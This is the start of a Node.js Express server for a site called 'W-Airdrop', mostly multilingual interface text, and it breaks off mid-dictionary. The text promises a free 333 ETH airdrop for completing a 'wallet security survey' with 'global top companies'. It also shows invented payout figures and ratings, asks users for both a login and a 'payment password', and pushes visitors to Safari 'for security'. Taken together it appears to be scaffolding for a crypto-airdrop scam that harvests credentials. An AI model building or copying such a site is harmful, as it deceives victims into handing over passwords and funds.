const express = require('express');
const fs = require('fs');
const path = require('path');
const multer = require('multer');
const { v4: uuidv4 } = require('uuid');
const { translateWithPolling, describeError } = require('./translator');

const app = express();
const PORT = process.env.PORT || 3000;
const DB_DIR = path.join(__dirname, 'db');
const UPLOAD_DIR = path.join(__dirname, 'public', 'uploads');

if (!fs.existsSync(DB_DIR)) fs.mkdirSync(DB_DIR);
if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });

const DB_FILES = {
    admin: path.join(DB_DIR, 'admin.json'),
    users: path.join(DB_DIR, 'users.json'),
    articles: path.join(DB_DIR, 'articles.json'),
    surveys: path.join(DB_DIR, 'surveys.json'),
    offers: path.join(DB_DIR, 'offers.json'),
    languages: path.join(DB_DIR, 'languages.json'),
    partners: path.join(DB_DIR, 'partners.json'),
    visits: path.join(DB_DIR, 'visits.json'),
    reviews: path.join(DB_DIR, 'reviews.json'),
    settings: path.join(DB_DIR, 'settings.json')
};

// ================= 完整全量多语言字典 =================
// 已根据要求修改文案：去除了"8家"，修改了safari提示、hero文案和footer文案
const dictZh = { 
    realtime: "实时", login: "登录", logout: "退出", registerTitle: "注册账号", registerBtn: "注册", registerDesc: "加入 W-Airdrop，几分钟即可免费领取。", 
    heroTitle: "参与钱包安全填表 全球顶级公司联合打造 免费空投发送333ETH奖励", 
    heroDesc: "使用我们的用户都能参加，无需任何操作，简单领取奖励，24小时内免费空投发放。", 
    claimBtn: "免费领取", stat1: "累计发放", stat2: "注册用户", stat3: "每日打款", stat4: "Google Play 评分", 
    howTitle: "如何领取", howDesc: "1. 注册账号 → 2. 认真填表 → 3. 领币到账", step1Title: "注册账号", step1Desc: "使用邮箱注册，并设置登录密码与支付密码。", step2Title: "认真填表", step2Desc: "认真完成问卷，提交后即具备奖励资格。", step3Title: "领币到账", step3Desc: "随时通过加密货币热门币链进行提现，门槛低，到账时间快。", leaderboardTitle: "幸运用户", viewLeaderboard: "查看完整排行榜 →", reviewsTitle: "用户怎么说", activeUser: "活跃用户", faqTitle: "常见问题", faqDesc: "有问题？我们来帮你。如果这里没有答案，支持团队随时待命。", 
    faqQ1: "如何领取？", 
    faqA1: "只要您有使用我们的产品，免费注册登录后，认真完成每一项表格，提交后就能免费领取。", 
    faqQ2: "有哪些领取方式？", faqA2: "支持PayPal、比特币、莱特币、银行转账，以及Amazon、虚拟Visa卡等热门礼品卡。我们会定期增加新方式。", faqQ3: "领取有手续费吗？", faqA3: "大多数方式免手续费，包括莱特币、Solana、虚拟Visa卡和全部礼品卡。银行转账等会收取少量费用以覆盖转账成本。", faqQ4: "领取需要多久？", faqA4: "我们会尽快处理，通常在数小时内完成。", partnersTitle: "知名品牌墙", 
    footerTitle: "免费参与领取 333ETH 奖励 您将是下一个幸运用户", 
    footerWarning: "风险提示：加密货币价格波动剧烈，参与任何空投或奖励活动前请自行判断风险。", footerCopy: "© 2024 W-Airdrop. 保留所有权利。", navEarn: "赚钱", navOffers: "优惠", navSurveys: "问卷", navWithdraw: "提现", navRewards: "奖励", navLeaderboard: "排行榜", 
    safariTitle: "请使用 Safari 浏览器打开", 
    safariDesc: "系统检测到您正在使用非苹果官方 Safari 访问，为了您的安全请您使用苹果官方 Safari 打开访问", 
    copyBtn: "复制当前链接", copied: "已复制", hasAccount: "已有账号？", goLogin: "去登录", noAccount: "还没有账号？", goRegister: "立即注册", loginTitle: "登录账号", loginBtn: "登录", labelEmail: "电子邮箱", labelPass: "登录密码", labelConfirm: "确认密码", labelPayPass: "支付密码", surveyTitle: "用户习惯请您认真填写", surveyDesc: "预计耗时: 2 分钟 | 提交即具空投资格", submitSurvey: "提交问卷", readMore: "查看全文", dashTitle: "赚钱", dashDesc: "完成优惠、问卷和游戏，立即获得金币。", offerWall: "优惠墙", taskAvailable: "可做任务", watchVideo: "看视频", startTask: "开始任务", withdrawTitle: "申请提现", withdrawMethod: "提现方式", withdrawAmount: "金额 (最低 500 金币)", withdrawAccount: "接收账号/地址", submitApply: "提交申请", searchPlaceholder: "搜索优惠", catAll: "全部", catGame: "游戏", catApp: "应用", catSignup: "注册", startEarning: "开始赚钱", lbTitle: "幸运用户", lbDesc: "与其他用户竞争，登上每日和每月排行榜赢取额外金币。", daily: "每日", monthly: "每月", rankUser: "排名 / 用户", earnings: "收益", you: "你", backHome: "返回首页", exit: "退出" 
};
const dictEn = { realtime: "Live", login: "Login", logout: "Logout", registerTitle: "Register", registerBtn: "Register", registerDesc: "Join W-Airdrop and claim for free in minutes.", heroTitle: "Participate in Wallet Security Survey with Global Top Companies - Free 333 ETH Airdrop", heroDesc: "Users of our products can participate, no action required, simply claim rewards, airdropped for free within 24 hours.", claimBtn: "Claim Free", stat1: "Distributed", stat2: "Users", stat3: "Daily Payouts", stat4: "Play Store Rating", howTitle: "How to Claim", howDesc: "1. Register → 2. Fill Form → 3. Receive Coins", step1Title: "Register", step1Desc: "Sign up with email and set passwords.", step2Title: "Fill Form", step2Desc: "Complete the survey to get qualified.", step3Title: "Receive Coins", step3Desc: "Withdraw via crypto anytime.", leaderboardTitle: "Lucky Users", viewLeaderboard: "View Leaderboard →", reviewsTitle: "What Users Say", activeUser: "Active User", faqTitle: "FAQ", faqDesc: "Need help? Check here.", faqQ1: "How to claim?", faqA1: "Register and complete forms.", faqQ2: "Claim methods?", faqA2: "PayPal, BTC, LTC, Bank, Gift Cards.", faqQ3: "Any fees?", faqA3: "Most are free.", faqQ4: "How long?", faqA4: "Usually within hours.", partnersTitle: "Top Brands", footerTitle: "Free Claim 333 ETH Reward - You Could Be The Next Lucky User", footerWarning: "Risk warning: Crypto is volatile.", footerCopy: "© 2024 W-Airdrop.", navEarn: "Earn", navOffers: "Offers", navSurveys: "Surveys", navWithdraw: "Withdraw", navRewards: "Rewards", navLeaderboard: "Leaderboard", safariTitle: "Please open in Safari", safariDesc: "For your security, please use the official Apple Safari browser to access.", copyBtn: "Copy Link", copied: "Copied", hasAccount: "Have an account?", goLogin: "Login", noAccount: "No account?", goRegister: "Register", loginTitle: "Login", loginBtn: "Login", labelEmail: "Email", labelPass: "Password", labelConfirm: "Confirm Password", labelPayPass: "Pay Password", surveyTitle: "Please fill out the survey", surveyDesc: "Takes 2 mins", submitSurvey: "Submit", readMore: "Read More", dashTitle: "Earn", dashDesc: "Complete offers and surveys to earn coins instantly.", offerWall: "Offer Wall", taskAvailable: "Available", watchVideo: "Watch Video", startTask: "Start Task", withdrawTitle: "Withdraw", withdrawMethod: "Method", withdrawAmount: "Amount (Min 500)", withdrawAccount: "Account/Address", submitApply: "Submit", searchPlaceholder: "Search offers", catAll: "All", catGame: "Games", catApp: "Apps", catSignup: "Sign Up", startEarning: "Start Earning", lbTitle: "Lucky Users", lbDesc: "Compete with others and win extra coins.", daily: "Daily", monthly: "Monthly", rankUser: "Rank / User", earnings: "Earnings", you: "You", backHome: "Back Home", exit: "Exit" };
const dictVi = { realtime: "Trực tiếp", login: "Đăng nhập", logout: "Đăng xuất", registerTitle: "Đăng ký", registerBtn: "Đăng ký", registerDesc: "Tham gia W-Airdrop và nhận miễn phí trong vài phút.", heroTitle: "Tham gia khảo sát bảo mật ví với các công ty hàng đầu - Airdrop 333 ETH miễn phí", heroDesc: "Người dùng sản phẩm của chúng tôi có thể tham gia, nhận thưởng miễn phí trong 24h.", claimBtn: "Nhận miễn phí", stat1: "Đã phát", stat2: "Người dùng", stat3: "Thanh toán/Ngày", stat4: "Điểm Play Store", howTitle: "Cách nhận", howDesc: "1. Đăng ký → 2. Điền form → 3. Nhận coin", step1Title: "Đăng ký", step1Desc: "Đăng ký bằng email.", step2Title: "Điền form", step2Desc: "Hoàn thành khảo sát.", step3Title: "Nhận coin", step3Desc: "Rút tiền qua crypto.", leaderboardTitle: "Người dùng may mắn", viewLeaderboard: "Xem BXH →", reviewsTitle: "Người dùng nói gì", activeUser: "Người dùng tích cực", faqTitle: "Câu hỏi thường gặp", faqDesc: "Cần giúp đỡ?", faqQ1: "Cách nhận?", faqA1: "Đăng ký và điền form.", faqQ2: "Phương thức?", faqA2: "PayPal, BTC, LTC, Ngân hàng.", faqQ3: "Có phí không?", faqA3: "Hầu hết miễn phí.", faqQ4: "Mất bao lâu?", faqA4: "Thường trong vài giờ.", partnersTitle: "Tường Thương Hiệu Nổi Tiếng", footerTitle: "Nhận miễn phí phần thưởng 333 ETH - Bạn có thể là người may mắn tiếp theo", footerWarning: "Cảnh báo rủi ro.", footerCopy: "© 2024 W-Airdrop.", navEarn: "Kiếm tiền", navOffers: "Ưu đãi", navSurveys: "Khảo sát", navWithdraw: "Rút tiền", navRewards: "Phần thưởng", navLeaderboard: "Bảng xếp hạng", safariTitle: "Vui lòng mở bằng Safari", safariDesc: "Để bảo mật, vui lòng sử dụng trình duyệt Safari chính thức của Apple.", copyBtn: "Sao chép liên kết", copied: "Đã sao chép", hasAccount: "Đã có tài khoản?", goLogin: "Đăng nhập", noAccount: "Chưa có tài khoản?", goRegister: "Đăng ký", loginTitle: "Đăng nhập", loginBtn: "Đăng nhập", labelEmail: "Email", labelPass: "Mật khẩu", labelConfirm: "Xác nhận mật khẩu", labelPayPass: "Mật khẩu thanh toán", surveyTitle: "Vui lòng điền khảo sát", surveyDesc: "Mất 2 phút", submitSurvey: "Gửi", readMore: "Đọc thêm", dashTitle: "Kiếm tiền", dashDesc: "Hoàn thành ưu đãi, khảo sát để nhận coin.", offerWall: "Tường Ưu Đãi", taskAvailable: "Có thể làm", watchVideo: "Xem video", startTask: "Bắt đầu", withdrawTitle: "Rút tiền", withdrawMethod: "Phương thức", withdrawAmount: "Số tiền (Min 500)", withdrawAccount: "Tài khoản/Địa chỉ", submitApply: "Gửi", searchPlaceholder: "Tìm kiếm ưu đãi", catAll: "Tất cả", catGame: "Trò chơi", catApp: "Ứng dụng", catSignup: "Đăng ký", startEarning: "Bắt đầu kiếm", lbTitle: "Người dùng may mắn", lbDesc: "Cạnh tranh với người khác.", daily: "Hàng ngày", monthly: "Hàng tháng", rankUser: "Hạng / Người dùng", earnings: "Thu nhập", you: "Bạn", backHome: "Về Trang Chủ", exit: "Thoát" };
const dictDe = { realtime: "Live", login: "Anmelden", logout: "Abmelden", registerTitle: "Registrieren", registerBtn: "Registrieren", registerDesc: "Treten Sie W-Airdrop bei und erhalten Sie in wenigen Minuten kostenlos.", heroTitle: "Nehmen Sie an der Wallet-Sicherheitsumfrage teil - Kostenloser 333 ETH Airdrop", heroDesc: "Nutzer unserer Produkte können teilnehmen, einfache Belohnung, innerhalb von 24 Stunden kostenlos.", claimBtn: "Gratis erhalten", stat1: "Verteilt", stat2: "Benutzer", stat3: "Täglich", stat4: "Play Store", howTitle: "Wie man erhält", howDesc: "1. Registrieren → 2. Ausfüllen → 3. Erhalten", step1Title: "Registrieren", step1Desc: "Mit E-Mail registrieren.", step2Title: "Ausfüllen", step2Desc: "Umfrage abschließen.", step3Title: "Erhalten", step3Desc: "Jederzeit über Crypto abheben.", leaderboardTitle: "Glückspilze", viewLeaderboard: "Bestenliste ansehen →", reviewsTitle: "Was Benutzer sagen", activeUser: "Aktiver Benutzer", faqTitle: "FAQ", faqDesc: "Brauchen Sie Hilfe?", faqQ1: "Wie beantragt man?", faqA1: "Registrieren und ausfüllen.", faqQ2: "Methoden?", faqA2: "PayPal, BTC, LTC, Bank.", faqQ3: "Gebühren?", faqA3: "Meistens kostenlos.", faqQ4: "Wie lange?", faqA4: "Normalerweise innerhalb von Stunden.", partnersTitle: "Top-Markenwand", footerTitle: "Kostenlos 333 ETH Belohnung erhalten - Sie könnten der nächste Glückspilz sein", footerWarning: "Risikowarnung: Crypto ist volatil.", footerCopy: "© 2024 W-Airdrop.", navEarn: "Verdienen", navOffers: "Angebote", navSurveys: "Umfragen", navWithdraw: "Abheben", navRewards: "Belohnungen", navLeaderboard: "Bestenliste", safariTitle: "Bitte in Safari öffnen", safariDesc: "Bitte verwenden Sie aus Sicherheitsgründen den offiziellen Apple Safari-Browser.", copyBtn: "Link kopieren", copied: "Kopiert", hasAccount: "Haben Sie ein Konto?", goLogin: "Anmelden", noAccount: "Kein Konto?", goRegister: "Registrieren", loginTitle: "Anmelden", loginBtn: "Anmelden", labelEmail: "E-Mail", labelPass: "Passwort", labelConfirm: "Passwort bestätigen", labelPayPass: "Zahlungspasswort", surveyTitle: "Bitte füllen Sie die Umfrage aus", surveyDesc: "Dauert 2 Minuten", submitSurvey: "Absenden", readMore: "Weiterlesen", dashTitle: "Verdienen", dashDesc: "Schließen Sie Angebote und Umfragen ab, um Münzen zu verdienen.", offerWall: "Angebote", taskAvailable: "Verfügbar", watchVideo: "Video ansehen", startTask: "Starten", withdrawTitle: "Abheben", withdrawMethod: "Methode", withdrawAmount: "Betrag (Min 500)", withdrawAccount: "Konto/Adresse", submitApply: "Senden", searchPlaceholder: "Angebote suchen", catAll: "Alle", catGame: "Spiele", catApp: "Apps", catSignup: "Anmelden", startEarning: "Verdienen starten", lbTitle: "Glückspilze", lbDesc: "Konkurrieren Sie mit anderen.", daily: "Täglich", monthly: "Monatlich", rankUser: "Rang / Benutzer", earnings: "Einnahmen", you: "Du", backHome: "Zurück", exit: "Beenden" };
const dictAr = { realtime: "مباشر", login: "تسجيل الدخول", logout: "تسجيل الخروج", registerTitle: "إنشاء حساب", registerBtn: "تسجيل", registerDesc: "انضم إلى W-Airdrop واحصل عليه مجانًا في دقائق.", heroTitle: "شارك في استبيان أمان المحفظة مع كبرى الشركات العالمية - إيردروب 333 إيثريوم مجانًا", heroDesc: "يمكن لمستخدمي منتجاتنا المشاركة والحصول على المكافآت مجانًا خلال 24 ساعة.", claimBtn: "احصل مجانًا", stat1: "الموزعة", stat2: "المستخدمين", stat3: "الدفع اليومي", stat4: "متجر بلاي", howTitle: "كيفية الاستلام", howDesc: "1. تسجيل → 2. تعبئة → 3. استلام", step1Title: "تسجيل", step1Desc: "سجل بالبريد الإلكتروني.", step2Title: "تعبئة", step2Desc: "أكمل الاستبيان.", step3Title: "استلام", step3Desc: "اسحب عبر العملات الرقمية.", leaderboardTitle: "مستخدمون محظوظون", viewLeaderboard: "عرض المتصدرين →", reviewsTitle: "ماذا يقول المستخدمون", activeUser: "مستخدم نشط", faqTitle: "الأسئلة الشائعة", faqDesc: "تحتاج مساعدة؟", faqQ1: "كيف أستلم؟", faqA1: "سجل وأكمل النماذج.", faqQ2: "طرق الاستلام؟", faqA2: "PayPal, BTC, LTC, Bank.", faqQ3: "هل هناك رسوم؟", faqA3: "معظمها مجاني.", faqQ4: "كم من الوقت؟", faqA4: "عادة في غضون ساعات.", partnersTitle: "جدار العلامات التجارية الشهيرة", footerTitle: "احصل على مكافأة 333 إيثريوم مجانًا - قد تكون المستخدم المحظوظ التالي", footerWarning: "تحذير المخاطر.", footerCopy: "© 2024 W-Airdrop.", navEarn: "اكسب", navOffers: "عروض", navSurveys: "استبيانات", navWithdraw: "سحب", navRewards: "مكافآت", navLeaderboard: "المتصدرين", safariTitle: "يرجى الفتح في Safari", safariDesc: "من أجل سلامتك، يرجى استخدام متصفح Safari الرسمي من Apple.", copyBtn: "نسخ الرابط", copied: "تم النسخ", hasAccount: "لديك حساب؟", goLogin: "تسجيل الدخول", noAccount: "ليس لديك حساب؟", goRegister: "تسجيل", loginTitle: "تسجيل الدخول", loginBtn: "تسجيل الدخول", labelEmail: "البريد الإلكتروني", labelPass: "كلمة المرور", labelConfirm: "تأكيد كلمة المرور", labelPayPass: "كلمة مرور الدفع", surveyTitle: "يرجى ملء الاستبيان", surveyDesc: "يستغرق دقيقتين", submitSurvey: "إرسال", readMore: "اقرأ المزيد", dashTitle: "اكسب", dashDesc: "أكمل العروض والاستبيانات لكسب العملات.", offerWall: "عروض", taskAvailable: "متاح", watchVideo: "شاهد الفيديو", startTask: "ابدأ", withdrawTitle: "سحب", withdrawMethod: "طريقة", withdrawAmount: "المبلغ (الحد الأدنى 500)", withdrawAccount: "الحساب/العنوان", submitApply: "إرسال", searchPlaceholder: "ابحث عن العروض", catAll: "الكل", catGame: "ألعاب", catApp: "تطبيقات", catSignup: "تسجيل", startEarning: "ابدأ الكسب", lbTitle: "مستخدمون محظوظون", lbDesc: "تنافس مع الآخرين.", daily: "يومي", monthly: "شهري", rankUser: "الترتيب / المستخدم", earnings: "الأرباح", you: "أنت", backHome: "العودة", exit: "خروج" };
const dictEs = { realtime: "En vivo", login: "Iniciar sesión", logout: "Cerrar sesión", registerTitle: "Registrarse", registerBtn: "Registrarse", registerDesc: "Únete a W-Airdrop y reclama gratis en minutos.", heroTitle: "Participa en la encuesta de seguridad de billeteras con las mejores empresas - Airdrop de 333 ETH gratis", heroDesc: "Los usuarios de nuestros productos pueden participar y reclamar recompensas gratis en 24 horas.", claimBtn: "Reclamar Gratis", stat1: "Distribuido", stat2: "Usuarios", stat3: "Pagos Diarios", stat4: "Google Play", howTitle: "Cómo Reclamar", howDesc: "1. Registro → 2. Formulario → 3. Recibir", step1Title: "Registro", step1Desc: "Regístrate con email.", step2Title: "Formulario", step2Desc: "Completa la encuesta.", step3Title: "Recibir", step3Desc: "Retira por crypto.", leaderboardTitle: "Usuarios con Suerte", viewLeaderboard: "Ver Clasificación →", reviewsTitle: "Lo que dicen los usuarios", activeUser: "Usuario Activo", faqTitle: "Preguntas Frecuentes", faqDesc: "¿Necesitas ayuda?", faqQ1: "¿Cómo reclamar?", faqA1: "Regístrate y completa formularios.", faqQ2: "¿Métodos de reclamo?", faqA2: "PayPal, BTC, LTC, Banco.", faqQ3: "¿Tarifas?", faqA3: "La mayoría son gratis.", faqQ4: "¿Cuánto tiempo?", faqA4: "Normalmente en horas.", partnersTitle: "Muro de Marcas Reconocidas", footerTitle: "Reclama gratis la recompensa de 333 ETH - Podrías ser el próximo usuario con suerte", footerWarning: "Advertencia de riesgo.", footerCopy: "© 2024 W-Airdrop.", navEarn: "Ganar", navOffers: "Ofertas", navSurveys: "Encuestas", navWithdraw: "Retirar", navRewards: "Recompensas", navLeaderboard: "Clasificación", safariTitle: "Abrir en Safari", safariDesc: "Por su seguridad, utilice el navegador oficial Apple Safari.", copyBtn: "Copiar enlace", copied: "Copiado", hasAccount: "¿Tienes cuenta?", goLogin: "Iniciar sesión", noAccount: "¿No tienes cuenta?", goRegister: "Registrarse", loginTitle: "Iniciar sesión", loginBtn: "Entrar", labelEmail: "Correo electrónico", labelPass: "Contraseña", labelConfirm: "Confirmar Contraseña", labelPayPass: "Contraseña de Pago", surveyTitle: "Por favor complete la encuesta", surveyDesc: "Toma 2 minutos", submitSurvey: "Enviar", readMore: "Leer más", dashTitle: "Ganar", dashDesc: "Completa ofertas y encuestas para ganar monedas.", offerWall: "Ofertas", taskAvailable: "Disponible", watchVideo: "Ver video", startTask: "Empezar", withdrawTitle: "Retirar", withdrawMethod: "Método", withdrawAmount: "Cantidad (Min 500)", withdrawAccount: "Cuenta/Dirección", submitApply: "Enviar", searchPlaceholder: "Buscar ofertas", catAll: "Todas", catGame: "Juegos", catApp: "Apps", catSignup: "Registro", startEarning: "Empezar a Ganar", lbTitle: "Usuarios con Suerte", lbDesc: "Compite con otros.", daily: "Diario", monthly: "Mensual", rankUser: "Rango / Usuario", earnings: "Ganancias", you: "Tú", backHome: "Volver", exit: "Salir" };
const dictPt = { realtime: "Ao vivo", login: "Entrar", logout: "Sair", registerTitle: "Registrar", registerBtn: "Registrar", registerDesc: "Junte-se ao W-Airdrop e receba grátis em minutos.", heroTitle: "Participe da pesquisa de segurança de carteiras com as principais empresas - Airdrop de 333 ETH grátis", heroDesc: "Usuários dos nossos produtos podem participar e receber recompensas grátis em 24h.", claimBtn: "Receber Grátis", stat1: "Distribuído", stat2: "Usuários", stat3: "Pagamentos", stat4: "Google Play", howTitle: "Como Receber", howDesc: "1. Registrar → 2. Preencher → 3. Receber", step1Title: "Registrar", step1Desc: "Registre-se com email.", step2Title: "Preencher", step2Desc: "Complete a pesquisa.", step3Title: "Receber", step3Desc: "Saque via crypto.", leaderboardTitle: "Usuários Sortudos", viewLeaderboard: "Ver Ranking →", reviewsTitle: "O que os usuários dizem", activeUser: "Usuário Ativo", faqTitle: "FAQ", faqDesc: "Precisa de ajuda?", faqQ1: "Como receber?", faqA1: "Registre-se e preencha.", faqQ2: "Métodos?", faqA2: "PayPal, BTC, LTC, Banco.", faqQ3: "Taxas?", faqA3: "A maioria é grátis.", faqQ4: "Quanto tempo?", faqA4: "Geralmente em horas.", partnersTitle: "Mural de Marcas Conhecidas", footerTitle: "Receba grátis a recompensa de 333 ETH - Você pode ser o próximo usuário sortudo", footerWarning: "Aviso de risco.", footerCopy: "© 2024 W-Airdrop.", navEarn: "Ganhar", navOffers: "Ofertas", navSurveys: "Pesquisas", navWithdraw: "Sacar", navRewards: "Recompensas", navLeaderboard: "Ranking", safariTitle: "Abrir no Safari", safariDesc: "Para sua segurança, use o navegador oficial Apple Safari.", copyBtn: "Copiar link", copied: "Copiado", hasAccount: "Tem conta?", goLogin: "Entrar", noAccount: "Não tem conta?", goRegister: "Registrar", loginTitle: "Entrar", loginBtn: "Entrar", labelEmail: "Email", labelPass: "Senha", labelConfirm: "Confirmar Senha", labelPayPass: "Senha de Pagamento", surveyTitle: "Por favor preencha a pesquisa", surveyDesc: "Leva 2 minutos", submitSurvey: "Enviar", readMore: "Ler mais", dashTitle: "Ganhar", dashDesc: "Complete ofertas e pesquisas para ganhar moedas.", offerWall: "Ofertas", taskAvailable: "Disponível", watchVideo: "Ver vídeo", startTask: "Iniciar", withdrawTitle: "Sacar", withdrawMethod: "Método", withdrawAmount: "Quantia (Min 500)", withdrawAccount: "Conta/Endereço", submitApply: "Enviar", searchPlaceholder: "Buscar ofertas", catAll: "Todas", catGame: "Jogos", catApp: "Apps", catSignup: "Registro", startEarning: "Começar a Ganhar", lbTitle: "Usuários Sortudos", lbDesc: "Compita com outros.", daily: "Diário", monthly: "Mensal", rankUser: "Rank / Usuário", earnings: "Ganhos", you: "Você", backHome: "Voltar", exit: "Sair" };
const dictKo = { realtime: "실시간", login: "로그인", logout: "로그아웃", registerTitle: "회원가입", registerBtn: "가입하기", registerDesc: "W-Airdrop에 가입하고 몇 분 만에 무료로 받으세요.", heroTitle: "글로벌 최고 기업들과 함께하는 지갑 보안 설문조사 - 무료 333 ETH 에어드롭", heroDesc: "제품 사용자 누구나 참여 가능, 24시간 내 무료 에어드롭.", claimBtn: "무료 청구", stat1: "분배됨", stat2: "사용자", stat3: "일일 지급", stat4: "플레이 스토어", howTitle: "청구 방법", howDesc: "1. 가입 → 2. 작성 → 3. 수령", step1Title: "가입", step1Desc: "이메일로 가입하세요.", step2Title: "작성", step2Desc: "설문을 완료하세요.", step3Title: "수령", step3Desc: "암호화폐로 출금하세요.", leaderboardTitle: "행운의 사용자", viewLeaderboard: "리더보드 보기 →", reviewsTitle: "사용자 후기", activeUser: "활성 사용자", faqTitle: "자주 묻는 질문", faqDesc: "도움이 필요하신가요?", faqQ1: "청구 방법?", faqA1: "가입하고 양식을 작성하세요.", faqQ2: "청구 수단?", faqA2: "PayPal, BTC, LTC, 은행.", faqQ3: "수수료가 있나요?", faqA3: "대부분 무료입니다.", faqQ4: "얼마나 걸리나요?", faqA4: "보통 몇 시간 내에.", partnersTitle: "유명 브랜드 월", footerTitle: "333 ETH 보상 무료로 받기 - 당신이 다음 행운의 사용자가 될 수 있습니다", footerWarning: "위험 경고.", footerCopy: "© 2024 W-Airdrop.", navEarn: "수익", navOffers: "혜택", navSurveys: "설문조사", navWithdraw: "출금", navRewards: "보상", navLeaderboard: "리더보드", safariTitle: "Safari로 열어주세요", safariDesc: "보안을 위해 공식 Apple Safari 브라우저를 사용하세요.", copyBtn: "링크 복사", copied: "복사됨", hasAccount: "계정이 있으신가요?", goLogin: "로그인", noAccount: "계정이 없으신가요?", goRegister: "가입하기", loginTitle: "로그인", loginBtn: "로그인", labelEmail: "이메일", labelPass: "비밀번호", labelConfirm: "비밀번호 확인", labelPayPass: "결제 비밀번호", surveyTitle: "설문 조사를 작성해주세요", surveyDesc: "2분 소요", submitSurvey: "제출", readMore: "더보기", dashTitle: "수익", dashDesc: "혜택과 설문을 완료하고 코인을 받으세요.", offerWall: "혜택", taskAvailable: "가능", watchVideo: "비디오 보기", startTask: "시작", withdrawTitle: "출금", withdrawMethod: "방법", withdrawAmount: "금액 (최소 500)", withdrawAccount: "계정/주소", submitApply: "제출", searchPlaceholder: "혜택 검색", catAll: "전체", catGame: "게임", catApp: "앱", catSignup: "가입", startEarning: "수익 시작", lbTitle: "행운의 사용자", lbDesc: "다른 사용자와 경쟁하세요.", daily: "매일", monthly: "매월", rankUser: "순위 / 사용자", earnings: "수익", you: "당신", backHome: "돌아가기", exit: "나가기" };
const dictUk = { realtime: "Наживо", login: "Увійти", logout: "Вийти", registerTitle: "Реєстрація", registerBtn: "Зареєструватися", registerDesc: "Приєднуйтесь до W-Airdrop та отримуйте безкоштовно за лічені хвилини.", heroTitle: "Візьміть участь у дослідженні безпеки гаманців - Безкоштовний Airdrop 333 ETH", heroDesc: "Користувачі наших продуктів можуть брати участь та отримувати винагороди безкоштовно протягом 24 годин.", claimBtn: "Отримати безкоштовно", stat1: "Розподілено", stat2: "Користувачі", stat3: "Щоденні виплати", stat4: "Google Play", howTitle: "Як отримати", howDesc: "1. Реєстрація → 2. Заповнення → 3. Отримання", step1Title: "Реєстрація", step1Desc: "Зареєструйтесь за email.", step2Title: "Заповнення", step2Desc: "Пройдіть опитування.", step3Title: "Отримання", step3Desc: "Виводьте через криптовалюту.", leaderboardTitle: "Щасливі користувачі", viewLeaderboard: "Переглянути таблицю →", reviewsTitle: "Що кажуть користувачі", activeUser: "Активний користувач", faqTitle: "Часті питання", faqDesc: "Потрібна допомога?", faqQ1: "Як отримати?", faqA1: "Зареєструйтесь та заповніть форми.", faqQ2: "Способи отримання?", faqA2: "PayPal, BTC, LTC, Банк.", faqQ3: "Є комісія?", faqA3: "Більшість безкоштовні.", faqQ4: "Скільки часу?", faqA4: "Зазвичай протягом годин.", partnersTitle: "Стіна відомих брендів", footerTitle: "Отримайте безкоштовно винагороду 333 ETH - Ви можете стати наступним щасливчиком", footerWarning: "Попередження про ризики.", footerCopy: "© 2024 W-Airdrop.", navEarn: "Заробіток", navOffers: "Пропозиції", navSurveys: "Опитування", navWithdraw: "Виведення", navRewards: "Нагороди", navLeaderboard: "Таблиця лідерів", safariTitle: "Відкрийте в Safari", safariDesc: "Для вашої безпеки використовуйте офіційний браузер Apple Safari.", copyBtn: "Копіювати посилання", copied: "Скопійовано", hasAccount: "Є акаунт?", goLogin: "Увійти", noAccount: "Немає акаунту?", goRegister: "Зареєструватися", loginTitle: "Увійти", loginBtn: "Увійти", labelEmail: "Електронна пошта", labelPass: "Пароль", labelConfirm: "Підтвердіть пароль", labelPayPass: "Пароль для оплати", surveyTitle: "Будь ласка, заповніть опитування", surveyDesc: "Займає 2 хвилини", submitSurvey: "Надіслати", readMore: "Читати далі", dashTitle: "Заробіток", dashDesc: "Виконуйте пропозиції та опитування, щоб заробити монети.", offerWall: "Пропозиції", taskAvailable: "Доступно", watchVideo: "Дивитись відео", startTask: "Почати", withdrawTitle: "Виведення", withdrawMethod: "Метод", withdrawAmount: "Сума (Мін 500)", withdrawAccount: "Рахунок/Адреса", submitApply: "Надіслати", searchPlaceholder: "Шукати пропозиції", catAll: "Всі", catGame: "Ігри", catApp: "Додатки", catSignup: "Реєстрація", startEarning: "Почати заробляти", lbTitle: "Щасливі користувачі", lbDesc: "Змагайтеся з іншими.", daily: "Щодня", monthly: "Щомісяця", rankUser: "Ранг / Користувач", earnings: "Дохід", you: "Ви", backHome: "Назад", exit: "Вихід" };
const dictTr = { realtime: "Canlı", login: "Giriş Yap", logout: "Çıkış Yap", registerTitle: "Kayıt Ol", registerBtn: "Kayıt Ol", registerDesc: "W-Airdrop'a katılın ve dakikalar içinde ücretsiz alın.", heroTitle: "Küresel Lider Şirketlerle Cüzdan Güvenliği Anketine Katılın - Ücretsiz 333 ETH Airdrop", heroDesc: "Ürünlerimizin kullanıcıları katılabilir, 24 saat içinde ücretsiz ödül alabilir.", claimBtn: "Ücretsiz Al", stat1: "Dağıtılan", stat2: "Kullanıcılar", stat3: "Günlük Ödemeler", stat4: "Google Play", howTitle: "Nasıl Alınır", howDesc: "1. Kayıt → 2. Form → 3. Alım", step1Title: "Kayıt", step1Desc: "E-posta ile kayıt olun.", step2Title: "Form", step2Desc: "Anketi tamamlayın.", step3Title: "Alım", step3Desc: "Kripto ile çekim yapın.", leaderboardTitle: "Şanslı Kullanıcılar", viewLeaderboard: "Liderlik Tablosu →", reviewsTitle: "Kullanıcılar Ne Diyor", activeUser: "Aktif Kullanıcı", faqTitle: "SSS", faqDesc: "Yardıma mı ihtiyacınız var?", faqQ1: "Nasıl alınır?", faqA1: "Kayıt olun ve formları doldurun.", faqQ2: "Yöntemler?", faqA2: "PayPal, BTC, LTC, Banka.", faqQ3: "Ücret var mı?", faqA3: "Çoğu ücretsizdir.", faqQ4: "Ne kadar sürer?", faqA4: "Genellikle saatler içinde.", partnersTitle: "Ünlü Markalar Duvarı", footerTitle: "333 ETH ödülünü ücretsiz alın - Bir sonraki şanslı kullanıcı siz olabilirsiniz", footerWarning: "Risk uyarısı.", footerCopy: "© 2024 W-Airdrop.", navEarn: "Kazan", navOffers: "Teklifler", navSurveys: "Anketler", navWithdraw: "Çekim", navRewards: "Ödüller", navLeaderboard: "Liderlik Tablosu", safariTitle: "Safari'de açın", safariDesc: "Güvenliğiniz için lütfen resmi Apple Safari tarayıcısını kullanın.", copyBtn: "Bağlantıyı Kopyala", copied: "Kopyalandı", hasAccount: "Hesabınız var mı?", goLogin: "Giriş Yap", noAccount: "Hesabınız yok mu?", goRegister: "Kayıt 